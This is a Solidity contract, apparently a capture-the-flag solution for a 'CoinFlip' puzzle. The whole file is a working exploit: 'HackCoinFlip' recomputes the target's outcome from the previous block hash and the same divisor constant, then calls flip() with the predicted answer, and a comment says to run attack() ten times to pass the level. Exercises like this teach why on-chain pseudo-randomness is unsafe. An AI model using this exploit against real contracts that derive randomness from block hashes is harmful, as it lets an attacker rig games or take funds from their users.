// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface CoinFlip {
    function flip(bool) external returns (bool);
}

contract HackCoinFlip {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlipContract;


    constructor(CoinFlip add) {
        coinFlipContract = CoinFlip(add);
    }

    // use 10x attack() to pass level
    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
        revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }
}
